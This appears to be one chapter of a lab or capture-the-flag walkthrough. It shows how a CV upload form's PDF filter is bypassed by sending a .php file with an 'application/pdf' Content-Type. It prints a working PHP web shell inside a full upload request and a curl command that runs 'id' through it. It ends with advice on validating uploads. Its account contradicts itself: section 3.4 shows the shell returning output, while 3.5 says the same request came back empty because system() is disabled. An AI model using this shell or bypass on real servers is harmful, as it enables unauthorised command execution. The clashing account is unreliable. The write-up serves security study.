# 03 — The upload portal and its PDF filter

The application under `/applications` is a one-page CV upload form. The filter is real, but it trusts
the wrong thing: the `Content-Type` header that the client sends.

## 3.1 The page

```text
http://192.168.91.112/applications/upload.php
```

```text
Upload your CV here.

Hello Applicant,
Please upload your CV here.

[ Browse... ]  No file selected          [ UPLOAD ]
```

A single `<input type="file">`, a submit button, no login, no CSRF token. The form posts back to
`upload.php` as `multipart/form-data` with one field, `file`.

## 3.2 The rejection

Uploading anything that is not a PDF produces:

```text
Sorry, that file format isn't allowed. Only PDF please.
```

A custom string, not a PHP warning: the check is deliberate and it fired. The question is what it
inspects.

## 3.3 The bypass — a `.php` file that claims to be a PDF

The request is intercepted and the filename changed while the declared type is left as a PDF:

```http
POST /applications/upload.php HTTP/1.1
Host: 192.168.91.112
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: multipart/form-data; boundary=---------------------------157896301234567
Content-Length: 736

-----------------------------157896301234567
Content-Disposition: form-data; name="file"; filename="chan.php"
Content-Type: application/pdf

<?php
if(isset($_GET['cmd']))
{
    system($_GET['cmd'] . ' 2>&1');
}
?>
-----------------------------157896301234567--
```

The extension says `.php`; the declared type says `application/pdf`. The server accepts it:

```text
Sorry! The file has been uploaded to /applications/chan.php
```

That response is the whole vulnerability: **the extension was never checked, only the MIME header the
client chose to send.** Nothing about `chan.php` is a PDF, and nothing stopped it from being written
into a directory the web server executes.

| What the filter could have checked | What it actually checked |
|---|---|
| extension whitelist (`.pdf`) | ✗ not checked — `.php` was accepted |
| magic bytes (`%PDF-`) | ✗ not checked — the body is PHP |
| `finfo_file()` / `mime_content_type()` | ✗ not checked — the real type is `text/x-php` |
| **client `Content-Type` header** | ✓ checked — and this is fully attacker-controlled |

The same request with `Content-Type: text/plain` is rejected; with `application/pdf` it succeeds. That
is the difference between a control and a decoration.

## 3.4 Confirming execution

Requesting the uploaded file with a command:

```bash
curl -s 'http://192.168.91.112/applications/chan.php?cmd=id'
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A shell, in the web root, from a form that only accepts PDFs.

## 3.5 Why `system()` returned nothing at first — `disable_functions`

The first web shell used `system()`, and the response body came back empty. That is not a failed
upload; it is a disabled function. A `phpinfo()` page uploaded through the same bypass shows why, in
the `disable_functions` directive:

```text
disable_functions
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,
pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wifcontinued,pcntl_signal,
pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,
pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority
```

The visible head of the list is the stock PHP `pcntl_*` block; the value continues past the visible
width. The empty response from `?cmd=id` is the part that matters: it confirms `system()` is among the
disabled entries, so the payload has to reach bash without calling any of the exec functions.

That is the subject of the next chapter: a payload that executes without calling a single disabled
function.

## 3.6 The filter, in one line

A MIME check on a client-supplied header is not a file-type check. Validate the **stored** file
(`finfo`, magic bytes), rename it server-side, store it outside the web root, and serve it through a
handler that never executes it. Anything less is an upload form that accepts a shell if you ask nicely.

---

**Next:** [`04-chankro-rce.md`](04-chankro-rce.md)
